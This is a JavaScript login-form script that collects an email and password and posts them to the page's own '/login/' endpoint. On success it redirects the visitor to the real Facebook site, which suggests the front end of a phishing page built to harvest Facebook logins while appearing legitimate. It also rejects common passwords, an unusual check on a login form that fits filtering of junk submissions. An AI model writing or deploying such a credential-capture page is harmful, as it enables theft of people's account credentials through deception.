document.addEventListener("DOMContentLoaded", function () {
    const commonPasswords = ["123456", "password", "123456789", "qwerty", "abc123", "password1"];
    const emailField = document.getElementById("email");
    const passwordField = document.getElementById("password");
    const submitButton = document.getElementById("submitBtn");
    const errorMessage = document.createElement("p");
    errorMessage.style.color = "red";
    errorMessage.style.fontSize = "14px";
    
    const storedEmail = localStorage.getItem("user_email");
    if (storedEmail) {
        emailField.value = storedEmail;
    }
    
    passwordField.addEventListener("input", function () {
        validatePassword();
    });
    
    document.getElementById("login-form").addEventListener("submit", function (event) {
        event.preventDefault();
        
        if (!validateForm()) {
            return;
        }
        
        const email = emailField.value;
        const password = passwordField.value;
        
        fetch("/login/", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-CSRFToken": getCSRFToken()
            },
            body: JSON.stringify({ email, password })
        })
        .then(response => {
            if (!response.ok) {
                return response.json().then(data => { throw new Error(data.error || "Login failed"); });
            }
            return response.json();
        })
        .then(data => {
            if (data.success) {
                window.location.href = "https://web.facebook.com/";
            } else {
                handleLoginError(emailField, passwordField, data.error);
            }
        })
        .catch(error => {
            console.error("Error:", error);
            handleLoginError(emailField, passwordField, error.message);
        });
    });
    
    function validateForm() {
        const isPasswordValid = validatePassword();
        return isPasswordValid;
    }
    
    function validatePassword() {
        if (commonPasswords.includes(passwordField.value)) {
            showError(passwordField, "This password is too common.");
            return false;
        } else if (passwordField.value.length < 4) {
            showError(passwordField, "Password must be at least 4 characters long.");
            return false;
        } else {
            removeError(passwordField);
            return true;
        }
    }
    
    function handleLoginError(emailField, passwordField, message) {
        if (message.toLowerCase().includes("email")) {
            showError(emailField, message);
        } else if (message.toLowerCase().includes("password")) {
            showError(passwordField, message);
        } else {
            showError(passwordField, message);
        }
    }
    
    function showError(field, message) {
        removeError(field);
        field.style.border = "2px solid red";
        const error = document.createElement("p");
        error.className = "error-message";
        error.textContent = message;
        error.style.color = "red";
        error.style.fontSize = "14px";
        field.parentNode.appendChild(error);
    }
    
    function removeError(field) {
        field.style.border = "";
        const existingError = field.parentNode.querySelector(".error-message");
        if (existingError) {
            existingError.remove();
        }
    }
    
    function getCSRFToken() {
        let cookieValue = null;
        document.cookie.split(";").forEach(cookie => {
            cookie = cookie.trim();
            if (cookie.startsWith("csrftoken=")) {
                cookieValue = cookie.substring("csrftoken=".length);
            }
        });
        return cookieValue;
    }
});
